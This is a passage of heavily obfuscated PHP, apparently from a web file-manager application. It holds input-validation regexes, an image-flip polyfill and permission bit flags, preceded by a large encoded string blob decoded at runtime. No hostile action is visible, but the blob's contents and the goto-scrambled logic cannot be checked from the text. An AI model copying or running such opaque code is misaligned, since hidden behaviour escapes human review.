315\303\44\154\344\153\121\20\304\10\145\220\146\213\236\41\116\50\257\360\224\372\206\172\301\302\303\337\356\13\105\27\205\240\137\324\56\77".base64_decode('9b9jTfCDtHBwnBRPcLyUQNuicVLa6f7BmtIVCIREV0+26vX1Cs4gyf4Yrt0NROmzp6+L8K8IoeAI').base64_decode('4cXtRL0pUphSP50a//D3R2HfRIVXwvGRGQ5raIeGw1JcxkYyMQVLBUoCOoKFtZMMICtTTj4Jenl2').base64_decode('u2tc02onT8qKsEgdBEbq3JP6SDUmcRhAmMzg7hU1Vaura111NZGGWqa+FaGWZZFIgSg/Da6avob7').base64_decode('nIwMuOoig5MFbbJVALCGAUbT9DwMeb9gWEZdzUBV9aCrbmBFJDIIg7UA1gzhkZCrrtYxf7K7TzVE').strrev('<®cR'."\n".'k R’èC1QtæiCè[ ^lÌô®)€}{iõ¤²]‚¢È¡÷Ï,¶ÔåÒ\\{9ì|')."\x57\xd0\xb7\x2a\xd3\xb2\xa8\x65\xb6\xd4\x4b\x6d\x40\x54\xb3\x58\x54\x5b\xfc\xfd\x9\xb5\xd3\xa7\x9\x5\x45\x45\x97\x99\x8\x22\xbe\xd0\x2\xe3\xc2\x73\xb7\x42\x5d\x81\xbc\x26\x38\x86\x81\x5\x51\x6f\x4a\x44\x10\x90\x8d\xf4\x38"."\236\204\260\123\17\320\0\241\116\210\265\270\340\206\137\130\150\73\155\156\271\310\66\252\274\17\161\30\20\62\231\132\10\17\174\12\355\153\250\257\23\256\23\76\32\43\75\0\373\70\152\373\40\63\327\316\10".base64_decode('21GuA4OkCa6FRaNURIrLeXhfk8An46DjybdZqK8XOsaDnCBKz1AFkL/HHw35T/SVJUAf0JVTwHof')."\xf6\x53\xf1\x47\x80\xf7\x4\x90\xff\x39\xb\xbc\xaf\x67\x71\x4f\xa0\xbf\x12\x6a\xb8\xbb\x97\xcb\x12\x42\x52\xbb\xa7\x27\x1c\x15\xf6\xa4\x78\xb3\x2\xb6\x5c\x6c\xb7\x42\x15\xd6\xe3\x7a\xbc\xa9\x31\xc6\xa6\x19\xf3\xcb\x46\x65\x79"."\62\123\350\232\317\335\54\224\234\114\177\237\356\167\274\334\73\12\311\206\16\136\111\25\220\257\30\222\101\74\305\21\223\35\122\305\63\34\266\241\42\206\34\266\343\311\230\232\223\251\27\333\54\375\166\226\131".base64_decode('w0GHUdTJDrJco5KBeHedZxeAxFxMB6k6MuoWzuxyZlBJidEujensodW8QhHwFSTB0ARuUjxxsyC+')."\266\44\274\157\17\142\13\271\73\126\301\114\317\331\40\261\26\105\161\311\70\62\115\110\300\232\342\25\114\375\154\136\24\220\55\55\236\274\310\212\74\124\210\61\137\70\66\333\74\352\52\126\22\255\342\250\63"."\x58\x58\x0\x7a\x20\x8\xb6\xc0\x10\xd3\x40\xb1\xf0\x79\x6b\xde\x32\x31\xb\xfa\x66\x59\x16\x9c\x6\x8d\xd7\x38\x2b\x13\x53\xc\xa8\x90\xd5\x47\xc5\xae\x4a\x29\x15\x3e\x85\x92\x84\x1e\x8d\xd3\x7d\x1c\xf5\x6f\x47\x3a\x89\xf7\x95"."\111\373\273\321\331\104\34\245\210\336\144\211\351\33\351\134\147\243\44\220\27\344\75\2\105\340\323\10\326\215\334\230\63\303\161\64\350\375\101\341\203\317\215\5\361\353\105\154\150\321\63\107\54\246\13\206\144"."\112\202\16\35\172\46\250\342\132\202\201\350\35\241\276\112\351\270\263\140\262\327\342\366\323\206\0\246\274\65\35\175\121\254\114\22\277\31\145\161\171\150\53\104\307\151\136\205\73\46\101\271\170\73\270\7\125"."\x0\x2\x7b\x1f\x64\xa2\xcb\x3b\x86\xfb\xb3\xc3\xef\x22\x51\x3f\xaf\x9e\x44\xc2\xe\xe\x6b\xc\x58\xee\x13\xcf\xc5\x3c\xd4\x12\x77\xfb\x60\x53\x1a\xf2\x7\x7a\x6a\x6a\xa1\x94\x65\xf1\x21\xd0\x3d\xc6\x1c\xa2\x83\x91\x44\xeb\x78".base64_decode('t1ziA8UiNJXRqWGJYDeTltwMxLBGlRhj24SRdva6GaiNdhN7/4YYTsPXB8RCA0RmHcUWUISXNjPP')."\x9b\x74\x4b\x34\x9a\x55\xe3\x52\x57\x60\x21\xdc\x8f\x7b\xfd\xa1\xc5\x52\x4a\x31\x25\x2e\x8\xa1\x8b\xb\xeb\xcc\x47\xe\x20\xd0\x41\x1f\x25\xfc\x18\x55\x6b\x41\x41\x27\x3a\x14\x71\x5a\xdc\xe\xb1\x5d\x8a\xe8\x92\x13\x16\x54\x56"."\60\36\165\261\70\170\242\342\114\60\303\131\33\56\25\34\312\162\210\337\27\362\300\135\216\225\127\40\60\331\377\130\313\31\123\340\335\100\345\157\27\52\174\227\340\147\370\171\212\220\101\315\25\125\103\345\154".strrev('ÒÊä4çSË×/Ë'."\0".'6ú…7ÄHx´ö	«ï!Æ8ó9Y”ï²·YÉ­ÆBt)¨—Ö_ˆ˜Õv€')."\x89\xa\xb7\xd7\x96\xc7\x9\x49\x32\xd8\x1d\xca\x2a\x25\x75\x1c\x16\x72\x4\xfd\xb\x3b\xc3\xe3\x15\x57\x86\xad\x26\xf8\xcb\x83\xb6\xca\xa8\x9\x2a\x41\x32\xdf\xe0\x40\x6e\x44\xe5\x61\x4d\x1e\x4b\x9d\xa0\xb2\x2\xe7\x1d\x7e\xaf"."\x3\x3d\xb\xc7\x1d\xcc\xa2\x20\x90\x31\x1d\xf0\xc8\xb\x55\xc0\x21\x3c\x9f\x85\x2e\x8e\xc9\xb4\x52\x35\x64\xd4\x4a\x6c\x39\x31\xcc\x1f\x88\xe2\x37\xb0\x70\xd4\x6d\x17\x9b\x93\xc8\x40\x14\x59\x1c\x9\xae\x8f\xdc\xf4\x18\x92\xf9"."\12\207\247\321\76\352\210\307\145\322\20\4\163\153\124\230\221\76\211\106\53\213\243\166\177\271\151\213\334\134\216\13\322\44\156\156\317\20\244\26\251\36\171\161\340\276\115\245\171\364\105\1\330\170\154\2\215"."\236\205\363\145\363\246\305\74\272\123\65\370\313\40\110\164\340\133\44\50\217\151\331\261\62\200\305\376\276\213\126\203\271\130\205\246\45\271\244\46\266\14\261\54\37\140\15\16\24\302\146\327\16\170\172\155\366".strrev('Q”¿!îb@¡_XSÃ•ô/é÷î'."\n".'®'."\r".'ˆOp°àA¦U×¡¡§0EÏ^ve¸û5ŠŠRè""')."\332\213\6\3\330\116\324\111\50\225\302\150\131\142\267\302\365\327\110\135\35\66\336\17\135\322\311\71\306\160\340\60\2\44\354\246\10\4\370\104\240\151\2\325\140\315\366\40\166\371\350\302\76\64\250\10\223"."\122\231\137\127\13\32\231\45\140\267\61\256\367\27\262\54\142\117\60\205\234\37\77\113\140\201\352\202\244\56\372\10\306\76\157\270\307\167\202\16\276\326\213\235\334\220\171\54\26\111\35\15\241\37\50\313\3"."\62\147\26\321\356\162\307\104\320\45\45\223\72\270\13\127\342\45\312\45\212\322\4\101\232\47\321\151\146\230\26\362\203\222\12\20\142\34\50\200\150\132\224\267\52\103\55\64\215\120\330\200\241\127\57\331\330"."\301\36\45\77\136\45\311\44\121\30\347\133\26\361\341\25\332\4\114\52\145\337\100\277\160\77\356\300\155\164\60\162\121\215\56\244\251\150\204\260\134\346\340\116\373\35\370\230\37\331\303\160\236\302\273\203\116"."\204\224\302\77\10\153\30\26\77\156\21\0\355\262\37\353\45\133\206\240\275\47\303\132\271\213\6\356\211\51\127\310\162\227\127\40\142\225\205\361\56\201\72\267\370\216\346\26\364\214\3\151\331\72\350\163\204".strrev('lòëùÛÍUßŒú~Qº©£*HîŒÔœÏ°(0rEü8(?ì}•pÛ0„ÌÔPªRÃ®lü')."\242\261\151\306\34\161\353\311\207\221\273\322\41\267\2\104\141\210\236\262\61\302\220\254\164\46\321\307\134\305\231\215\22\255\176\213\311\363\273\2\137\264\361\257\377\150\72\170\52\111\251\70\223\160\30\306\112"."\x16\xba\xa0\xd2\x57\xfe\xff\xf5\xc0\x71\x2a\x89\x42\x97\xaf\x3c\x66\x75\xce\x46\xb6\x9b\x3c\x59\x90\x35\x45\xa9\x18\x8c\x86\x87\xcd\x2f\x33\x1d\xc8\x65\xc6\xec\x4d\xc6\x8f\x93\xfe\xe7\x95\xa6\xc2\xa1\x6c\x75\xcd\x85\x52\xf9\x3a".base64_decode('C9kH/TI9IU7ZVk28VAtjK5yTKGYAWuaTkRe2IiDFgiasnCDGhAb+nhisGK3JOHsHOnd5ddBrBdwB')."\x8\x22\x53\xb\xc9\xa\xef\x4\x8b\xce\xff\x51\x41\x61\xc1\x69\x62\x79\xd1\x68\xf3\x4a\x2a\x49\x68\x16\xdd\xfc\x23\xaf\x79\x9e\x85\xec\x3d\x7\x78\x2b\xca\xab\x0\x63\x9c\x51\x99\x1a\x4f\x31\x35\xeb\xf3\x32\x1\x7a\x4\x8\x76"."\277\26\131\30\304\271\11\225\60\363\22\66\240\50\227\10\63\31\314\60\125\220\147\211\240\307\45\47\324\120\301\271\21\331\137\363\236\362\20\262\116\70\304\327\221\101\224\121\35\131\123\310\334\107\136\225\361".base64_decode('Z4UVhC8WPNRDrQxgRDhdQvInS0yLoil8AguHqKDFaoH4XKUJgCsBqY8sYyhIeStUQ0bWvzAP6T0r')."\257\100\15\372\216\265\20\26\307\274\172\13\13\253\310\273\17\24\123\11\31\71\54\61\22\341\62\36\322\340\26\156\243\120\234\371\153\245\217\227\321\67\315\144\346\132\6\372\344\141\273\57\174\132\105\120\62"."\31\276\116\210\17\316\144\142\262\356\2\344\64\154\122\37\146\225\42\342\133\12\25\66\15\124\2\341\15\310\251\361\341\12\76\213\140\147\103\355\36\201\105\13\13\133\31\32\347\32\140\375\143\132\171\64\204".strrev('cs ›QÇĞ–J|× „=Ø ¬¶v2 -ñ8—‘èå8~Î€¸7ñ-umØ{/-ß×‘(g„')."\44\103\354\133\353\343\44\202\323\304\162\167\126\345\45\261\311\50\146\341\113\7\216\303\167\243\255\373\141\261\150\174\333\14\367\174\101\270\75\163\331\212\147\263\247\342\214\121\15\174\212\50\356\101\100\110\254".base64_decode('KJ1yvbqGJAErlK0HgtWToJEUsjMt28kmENyFU3/8Eih+JB4+YwhYlxTq665BrtAhAAbwa3InEcHk')."\x24\x69\x82\x24\xfc\x87\xdf\x14\xac\x81\xc9\xb0\x90\x93\x24\x7f\xf\x7f\xd5\xb9\x56\xe2\x6f\xe1\x89\x2f\xd1\xc3\x23\xb0\xe\x8d\xd1\x4\xbc\xc5\x14\x14\x5e\xac\xf\x3b\x40\x5f\xcc\xd6\xf9\xd0\x5a\x9\x2d\xae\xe9\x86\x80\x26\x3c".strrev('Õ»¶ ­"ˆéì³™¼?;Eñ,ˆ ²‚!–™ƒåJ±BbS³Nd!ßG5nÁÇ¨º²]')."\353\54\112\104\140\372\172\50\51\101\70\215\267\336\213\260\7\330\313\170\130\101\355\22\222\121\56\372\110\35\370\205\157\76\370\271\73\10\224\214\317\12\75\105\231\51\311\330\163\365\131\4\143\341\26\45\216".base64_decode('CJLvXlDGGKgl+seTV+05zLSqJ9rUXMKOX8jFGJSjg8FoqwQGQhVn4za4sOJwRioX+Yk6F0cTiQ65').base64_decode('WAGVGW8zKIAwVCQFCU/TcHfFyqj4dYKXLF9vIGI5lD9dY28XmkYMTi42coKTN0JuHIRw4sz/Hy4K').base64_decode('On92Qd/a3DEgriPbVfJPWl/YYWhMQgM4SA3eaYHaPCbDczm68tqSyJZWKL7iztdCCl1CceI9yrgZ').base64_decode('QpU/wunV2sXCa0Q8gS5wmqXzBd7KGkYwg2KipTr2oUU7CU6XGJhFh144zWNNwviKrfZiBnvLcA69')."\254\177\110\236\312\237\266\177\200\166\217\375\26\223\27\42\154\144\312\256\130\303\132\205\74\270\106\25\263\341\44\230\223\113\160\226\274\306\250\152\306\323\25\363\342\44\230\267\54\231\146\26\366\344\102\76\123"."\x2e\x18\xe3\x34\xaf\xbc\xf3\xd0\x34\xb2\x75\x1d\x69\x30\x77\x6b\x2e\xa0\x8e\xd7\x9f\x15\x91\xcb\x3f\x47\x88\xc7\x8e\x8d\xf6\xd2\x95\x6b\x51\xf1\x4c\x60\xbc\x5a\x54\x44\x1e\xb7\x16\x1c\xdb\x76\x73\x5a\x89\x1f\xd2\x94\xa\x1c\x90"."\137\164\226\363\132\236\126\341\332\25\227\11\27\342\240\105\63\261\54\131\274\303\255\174\313\33\254\70\213\15\353\365\253\15\56\166\14\167\53\111\34\115\16\347\250\147\46\220\235\173\74\204\326\227\36\335\336".base64_decode('OVS2s/kQprSXKwh+ays6IXbAzW/57jJD/XaJLprxrkQDArSg7gGBopdhnE4/kuHHZEQSwDd2XlF7').base64_decode('+f17T9/94C27N1+3+/wzdl5wuWPXOTft2rBu14b1O8++bucVm3DCro2nfXDF+XOlXet+ChMvPfO9')."\207\356\305\377\356\274\361\201\367\67\77\272\373\221\315\30\145\347\226\7\336\337\162\323\356\213\67\355\72\353\276\135\227\135\273\353\222\263\116\20\72\5\324\133\347\316\12\55\67\215\25\322\135\374\164\326\342"."\x2a\x1b\xbd\xf6\xc6\xc\xdf\xb1\x4\x40\xce\xa7\xf1\x25\xc\x52\x0\x22\x90\xb6\x31\xb8\x77\x73\xe0\x85\x15\x27\x87\x34\xdd\x84\x6\xf1\x60\x41\xc8\xa3\xdf\x36\xcd\x34\x29\x9f\x2\x52\x35\xc2\x44\x72\x22\xf2\xb7\x23\x5c\x2d\x83".base64_decode('EH8LGA4hOhpHxI6YEgqS6yC4zw0pOBWxMksEHrmzSLD8bL2jYLt/4gCwQ41pJUJr6KEeXh94Nk66')."\xc5\x2e\xb\xf2\xb7\x19\x8\xb1\x8b\x17\xe5\x48\x63\xcd\x70\xe3\x14\x37\xd1\x6e\x77\xa2\x32\x9c\xe4\x49\x49\xa6\xdd\x46\xb2\x27\xd0\xe4\x64\x1e\x3b\xbf\xab\x4\x72\x5c\xc8\x8b\xc0\xef\x9f\xa3\x23\xa7\x9e\x40\x38\xea\x5b\xe6\xf"."\x85\x43\x65\x49\xbd\x9e\x50\xa8\x3f\x10\xf4\x62\xd\xd9\xb2\x64\x94\x4b\xd0\x4a\x28\x4b\xea\xed\xc\xf4\x8c\x97\xe6\xeb\xf6\xf8\xbb\xca\xd2\xa0\x96\x2\xd4\xdb\xa5\xaf\x9e\xe2\x24\x7f\x2f\xaa\xa5\xa7\xab\x8b\xaa\xc9\x95\xd7\xc2"."\337\276\230\327\4\335\273\361\63\341\174\132\243\107\254\66\25\36\172\204\36\222\351\154\24\37\367\120\262\354\310\113\50\302\172\34\41\16\263\101\137\345\145\201\174\331\26\105\220\56\240\46\101\17\51\54\110".base64_decode('nVHC5+MZZ2HiMmqQqKbEbxZdlhtIAY4mC+JvAhGKazcCELVa232PrQPL7zvtd4i8Q2C9F1FnFENa').base64_decode('TLhEwizQwvxEXRActiQD3hLWwnKK8BIozfBY25gYFs9NWhkrMeUUve23c3nhehv20v8B7STy3/zF')."\x0\x0", 10, -8))); goto Bâë”¼”ÇÑ; eÅ‰ŞŠã×ì: if (!function_exists($_SERVER[¼€¼ˆ¦‚¡][1872])) { define($_SERVER[¼€¼ˆ¦‚¡][1873], 0); define($_SERVER[¼€¼ˆ¦‚¡][1874], 1); define($_SERVER[¼€¼ˆ¦‚¡][1875], 2); function imageflip($DßİĞßÁä‰, $aø…ƒìÕ) { switch ($aø…ƒìÕ) { case IMG_FLIP_HORIZONTAL: $C´‰á›êØ… = imagesx($DßİĞßÁä‰) - 1; $C°¡±ò‹ß = $C´‰á›êØ… / 2; $aàÉìôñ¼ = imagesy($DßİĞßÁä‰); $CÃš±àè¥ù = imageistruecolor($DßİĞßÁä‰) ? imagecreatetruecolor(1, $aàÉìôñ¼) : imagecreate(1, $aàÉìôñ¼); for ($AÎ¯çŞÚ = 0; $AÎ¯çŞÚ < $C°¡±ò‹ß; ++$AÎ¯çŞÚ) { imagecopy($CÃš±àè¥ù, $DßİĞßÁä‰, 0, 0, $AÎ¯çŞÚ, 0, 1, $aàÉìôñ¼); imagecopy($DßİĞßÁä‰, $DßİĞßÁä‰, $AÎ¯çŞÚ, 0, $C´‰á›êØ… - $AÎ¯çŞÚ, 0, 1, $aàÉìôñ¼); imagecopy($DßİĞßÁä‰, $CÃš±àè¥ù, $C´‰á›êØ… - $AÎ¯çŞÚ, 0, 0, 0, 1, $aàÉìôñ¼); } break; case IMG_FLIP_VERTICAL: $c»ŞÍ‚¼„› = imagesx($DßİĞßÁä‰); $fä»—¼Ö’õ = imagesy($DßİĞßÁä‰) - 1; $fİÛÏ­­ = $fä»—¼Ö’õ / 2; $CÃš±àè¥ù = imageistruecolor($DßİĞßÁä‰) ? imagecreatetruecolor($c»ŞÍ‚¼„›, 1) : imagecreate($c»ŞÍ‚¼„›, 1); for ($d ÑğÖ™ó = 0; $d ÑğÖ™ó < $fİÛÏ­­; ++$d ÑğÖ™ó) { imagecopy($CÃš±àè¥ù, $DßİĞßÁä‰, 0, 0, 0, $d ÑğÖ™ó, $c»ŞÍ‚¼„›, 1); imagecopy($DßİĞßÁä‰, $DßİĞßÁä‰, 0, $d ÑğÖ™ó, 0, $fä»—¼Ö’õ - $d ÑğÖ™ó, $c»ŞÍ‚¼„›, 1); imagecopy($DßİĞßÁä‰, $CÃš±àè¥ù, 0, $fä»—¼Ö’õ - $d ÑğÖ™ó, 0, 0, $c»ŞÍ‚¼„›, 1); } break; case IMG_FLIP_BOTH: $c»ŞÍ‚¼„› = imagesx($DßİĞßÁä‰); $aàÉìôñ¼ = imagesy($DßİĞßÁä‰); $CÃš±àè¥ù = imagerotate($DßİĞßÁä‰, 180, 0); imagecopy($DßİĞßÁä‰, $CÃš±àè¥ù, 0, 0, 0, 0, $c»ŞÍ‚¼„›, $aàÉìôñ¼); break; default: return; } imagedestroy($CÃš±àè¥ù); } } if (!function_exists($_SERVER[¼€¼ˆ¦‚¡][1876])) { function imagecreatefrombmp($C²×ƒÌíŒ ) { return ImageGdBMP::load($C²×ƒÌíŒ ); } } class Input { public static function getArray($c²µƒ¹ÍíÀ) { goto fŒÚíâ½‰â; FÁË®¦Í½: $b§‚¥Ñ´Î = array(); $cæÇß›†ÅÑ = LNG($Eö­Éõ†…Í[1877]); foreach ($c²µƒ¹ÍíÀ as $bØâÈõÂ˜ => $A…â¶ƒì÷) { goto e‡›Ó‘œÕÆ; e‡›Ó‘œÕÆ: $D®ÚÓàÏÒÀ = _get($A…â¶ƒì÷, $Eö­Éõ†…Í[1246], $cæÇß›†ÅÑ . $Eö­Éõ†…Í[879] . $bØâÈõÂ˜); $AİŞéÛÌ¤ô = $bØâÈõÂ˜; if (isset($A…â¶ƒì÷[$Eö­Éõ†…Í[1878]]) && $A…â¶ƒì÷[$Eö­Éõ†…Í[1878]]) { $AİŞéÛÌ¤ô = $A…â¶ƒì÷[$Eö­Éõ†…Í[1878]]; } goto bÖ‹·šƒƒ—; E¼¦…¦ŠæÚ: if (isset($A…â¶ƒì÷[$Eö­Éõ†…Í[1880]]) && !self::check($in[$bØâÈõÂ˜], $A…â¶ƒì÷[$Eö­Éõ†…Í[1880]], $aæë·§òàø)) { if (array_key_exists($Eö­Éõ†…Í[1879], $A…â¶ƒì÷)) { if (!is_null($A…â¶ƒì÷[$Eö­Éõ†…Í[1879]])) { $C£é½Êƒò¦[$AİŞéÛÌ¤ô] = $A…â¶ƒì÷[$Eö­Éõ†…Í[1879]]; } } else { $b§‚¥Ñ´Î[] = $D®ÚÓàÏÒÀ; } continue; } $C£é½Êƒò¦[$AİŞéÛÌ¤ô] = $in[$bØâÈõÂ˜]; goto b«ùªİ„øì; bÖ‹·šƒƒ—: if (!array_key_exists($bØâÈõÂ˜, $in)) { if (array_key_exists($Eö­Éõ†…Í[1879], $A…â¶ƒì÷)) { if (!is_null($A…â¶ƒì÷[$Eö­Éõ†…Í[1879]])) { $C£é½Êƒò¦[$AİŞéÛÌ¤ô] = $A…â¶ƒì÷[$Eö­Éõ†…Í[1879]]; } } else { if (isset($A…â¶ƒì÷[$Eö­Éõ†…Í[1880]])) { $b§‚¥Ñ´Î[] = $D®ÚÓàÏÒÀ; } } continue; } if (isset($A…â¶ƒì÷[$Eö­Éõ†…Í[1880]]) && $A…â¶ƒì÷[$Eö­Éõ†…Í[1880]] == $Eö­Éõ†…Í[282]) { $e´¹¥½¸¼ = json_decode($in[$bØâÈõÂ˜], !0); if (is_array($e´¹¥½¸¼)) { $C£é½Êƒò¦[$AİŞéÛÌ¤ô] = $e´¹¥½¸¼; } else { if (array_key_exists($Eö­Éõ†…Í[1879], $A…â¶ƒì÷)) { if (!is_null($A…â¶ƒì÷[$Eö­Éõ†…Í[1879]])) { $C£é½Êƒò¦[$AİŞéÛÌ¤ô] = $A…â¶ƒì÷[$Eö­Éõ†…Í[1879]]; } } else { $b§‚¥Ñ´Î[] = $D®ÚÓàÏÒÀ; } } continue; } $aæë·§òàø = _get($A…â¶ƒì÷, $Eö­Éõ†…Í[1011]); goto E¼¦…¦ŠæÚ; b«ùªİ„øì: } goto b‚ŞŠìµ¯; b‚ŞŠìµ¯: if (count($b§‚¥Ñ´Î) > 0) { show_json(implode($Eö­Éõ†…Í[1881], $b§‚¥Ñ´Î), !1); } return $C£é½Êƒò¦; goto FåùÒçß; fŒÚíâ½‰â: $Eö­Éõ†…Í =& $_SERVER[¼€¼ˆ¦‚¡]; global $in; $C£é½Êƒò¦ = array(); goto FÁË®¦Í½; FåùÒçß: } public static function reg($a³©‚¦Ìâ† = "\x72\145\x71\165\151\162\145") { static $BŒ•–Â„¹ = array("\x72\x65\161\x75\151\162\145" => "\56\x2b", "\x6e\x75\155\x62\x65\x72" => "\134\x64\53", "\150\x65\170" => "\x5b\60\x2d\x39\101\x2d\x46\141\55\x66\135\53", "\151\156\x74" => "\x5b\55\x5c\53\135\77\x5c\144\x2b", "\x62\157\x6f\x6c" => "\60\x7c\x31", "\x66\154\157\141\x74" => "\133\x2d\x5c\x2b\135\77\134\144\53\x28\134\x2e\134\144\x2b\51\x3f", "\x65\156\x67\x6c\x69\x73\150" => "\133\101\x2d\132\141\55\172\40\135\x2b", "\143\x68\151\x6e\x65\163\145" => "\x5b\134\170\x7b\x34\x65\x30\60\x7d\x2d\x5c\x78\x7b\71\146\141\x35\175\135\53", "\150\x61\163\x43\x68\151\x6e\145\x73\x65" => "\x2f\x28\x5b\x5c\170\x7b\64\x65\60\60\x7d\55\x5c\170\173\x39\146\x61\x35\x7d\x5d\x2b\x29\57\165", "\x65\155\141\151\154" => "\x5c\167\53\x28\133\134\56\134\55\135\x5c\167\53\51\x2a\134\100\134\x77\x2b\x28\133\x5c\56\x5c\x2d\135\134\x77\53\51\52\x5c\x2e\134\x77\x2b", "\160\x68\x6f\x6e\x65" => "\61\x5b\63\x2d\71\135\134\x64\x7b\x39\175", "\x74\x65\x6c\x70\x68\157\x6e\x65" => "\50\x5c\x28\x5c\x64\173\63\x2c\x34\x7d\x5c\51\x7c\134\x64\x7b\63\x2c\64\175\55\174\x5c\x73\51\x3f\x5c\144\x7b\x37\54\61\x34\x7d", "\x75\162\154" => "\x28\150\164\164\160\x7c\x66\x74\x70\174\x68\164\x74\160\x73\51\x3a\x5c\x2f\x5c\57\x5b\134\x77\134\x2d\137\x5d\x2b\50\x5c\x2e\133\134\167\x5c\55\137\135\53\51\53\50\133\134\167\x5c\x2d\x5c\56\x2c\100\77\x5e\75\x25\x26\72\x5c\57\x7e\134\x2b\x23\135\x2a\133\x5c\x77\x5c\55\x5c\100\x3f\x5e\75\45\x26\134\x2f\x7e\134\x2b\43\135\x29\x3f", "\x75\162\154\x46\x75\x6c\154" => "\x5b\x61\55\x7a\101\x2d\172\135\53\x3a\x5c\57\134\57\133\136\134\163\x5d\x2a", "\151\x70" => "\x28\x5c\x64\173\61\x2c\x33\x7d\x5c\56\x29\173\63\175\50\134\144\173\61\54\63\x7d\51", "\172\x69\x70" => "\133\x31\x2d\x39\x5d\x5c\x64\x7b\65\x7d\x28\x3f\41\x5c\x64\51", "\x69\144\x43\141\162\144" => "\x28\134\144\173\61\65\x7d\x29\174\50\134\144\x7b\61\x37\x7d\x28\x5c\144\174\x58\174\x78\51\51", "\143\x6f\154\157\x72" => "\43\x28\133\x30\x2d\71\x41\x2d\x46\141\x2d\x66\135\173\x33\175\174\x5b\x30\55\71\101\x2d\x46\x61\55\146\135\173\66\x7d\x29", "\164\x69\x6d\145" => "\50\133\x30\x2d\x31\x5d\134\144\x7c\62\x5b\60\x2d\x34\x5d\51\72\133\60\55\x35\x5d\134\144", "\x64\x61\164\x65" => "\x5c\x64\x7b\64\175\133\55\x5c\57\x5d\x3f\50\x30\133\x31\x2d\x39\x5d\x7c\x31\133\x30\55\x32\135\x29\x5b\55\x5c\57\x5d\77\50\x5b\60\55\62\x5d\134\x64\x7c\x33\x5b\60\55\61\135\x29", "\x64\141\x74\145\124\151\x6d\145" => "\x5c\144\x7b\64\175\x5b\x2d\x5c\57\135\x3f\x28\x30\133\61\55\71\x5d\x7c\x31\x5b\x30\55\62\135\x29\x5b\55\134\x2f\135\x3f\50\133\x30\x2d\x32\135\x5c\144\x7c\63\133\60\x2d\x31\x5d\51\x5c\x73\x2b\x28\x5b\x30\55\61\135\x5c\144\174\62\x5b\60\55\x34\x5d\51\72\x5b\x30\55\65\x5d\134\x64", "\160\141\163\x73\x77\x6f\x72\x64" => "\50\77\x3d\56\52\134\x64\51\x28\x3f\75\x2e\52\x5b\141\55\172\x5d\51\x28\x3f\75\56\x2a\133\x41\55\132\135\51\x2e\x7b\x38\54\x32\60\175", "\x6b\145\171" => "\133\101\55\x5a\x61\55\172\60\55\71\x5f\134\55\134\56\x5d\x2b", "\x6b\x65\171\106\x75\x6c\154" => "\133\x41\x2d\x5a\141\55\x7a\x30\x2d\x39\137\x5c\55\134\56\134\163\x2c\x5d\53"); if (!$a³©‚¦Ìâ†) { return $BŒ•–Â„¹; } return $BŒ•–Â„¹[$a³©‚¦Ìâ†]; } public static function check($E¶ÂáÎò×, $A‚ïŠŒ¢™Ö, $BÔŸôÌªª¬ = null) { $CÁÊİÒì’ =& $_SERVER[¼€¼ˆ¦‚¡]; switch ($A‚ïŠŒ¢™Ö) { case $CÁÊİÒì’[7]: return in_array($E¶ÂáÎò×, $BÔŸôÌªª¬); break; case $CÁÊİÒì’[1882]: return floatval($E¶ÂáÎò×) > $BÔŸôÌªª¬; break; case $CÁÊİÒì’[1883]: return floatval($E¶ÂáÎò×) < $BÔŸôÌªª¬; break; case $CÁÊİÒì’[325]: return strlen($E¶ÂáÎò×) >= $BÔŸôÌªª¬[0] && strlen($E¶ÂáÎò×) <= $BÔŸôÌªª¬[1]; break; case $CÁÊİÒì’[325]: if (is_array($BÔŸôÌªª¬)) { return strlen($E¶ÂáÎò×) >= $BÔŸôÌªª¬[0] && strlen($E¶ÂáÎò×) <= $BÔŸôÌªª¬[1]; break; } else { return strlen($E¶ÂáÎò×) == $BÔŸôÌªª¬; break; } case $CÁÊİÒì’[321]: return floatval($E¶ÂáÎò×) >= $BÔŸôÌªª¬[0] && floatval($E¶ÂáÎò×) <= $BÔŸôÌªª¬[1]; break; } $bÌ× Ô÷¨ = self::reg(!1); $A‚ïŠŒ¢™Ö = isset($bÌ× Ô÷¨[$A‚ïŠŒ¢™Ö]) ? $bÌ× Ô÷¨[$A‚ïŠŒ¢™Ö] : $A‚ïŠŒ¢™Ö; if (substr($A‚ïŠŒ¢™Ö, 0, 1) != $CÁÊİÒì’[8]) { $A‚ïŠŒ¢™Ö = $CÁÊİÒì’[1884] . $A‚ïŠŒ¢™Ö . $CÁÊİÒì’[1885]; } return preg_match($A‚ïŠŒ¢™Ö, $E¶ÂáÎò×) === 1; } public static function get($F´ß®¥¥ß, $C‰œ‚ìÄâí = null, $A¹ë³¾¾™ = null, $Fá·ÜèÀåí = null) { goto C¢‡“Ç¨Éù; a§ôéÂÀ‡ß: if (!is_null($Fá·ÜèÀåí)) { $fèµ„·é¹[$eŠôˆÎˆƒÜ[1011]] = $Fá·ÜèÀåí; } if (!is_null($C‰œ‚ìÄâí)) { $fèµ„·é¹[$eŠôˆÎˆƒÜ[1880]] = $C‰œ‚ìÄâí; } $f×ÕÂ×²°î = Input::getArray(array($F´ß®¥¥ß => $fèµ„·é¹)); goto a¡²Ô±´Ìº; C¢‡“Ç¨Éù: $eŠôˆÎˆƒÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $fèµ„·é¹ = array(); if (!is_null($A¹ë³¾¾™)) { $fèµ„·é¹[$eŠôˆÎˆƒÜ[34]] = $A¹ë³¾¾™; } goto a§ôéÂÀ‡ß; a¡²Ô±´Ìº: return $f×ÕÂ×²°î[$F´ß®¥¥ß]; goto c»…»íÜ; c»…»íÜ: } } goto FŠºèâÔŞ; c Ø¨îíÏé: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $bæîë¨‘ï =& $_SERVER[¼€¼ˆ¦‚¡]; $cÏª®„Š®† = array(array($bæîë¨‘ï[386] => LNG($bæîë¨‘ï[2106]), $bæîë¨‘ï[2107] => $bæîë¨‘ï[2108], $bæîë¨‘ï[2109] => 6, $bæîë¨‘ï[2110] => 1, $bæîë¨‘ï[2111] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bæîë¨‘ï[386] => 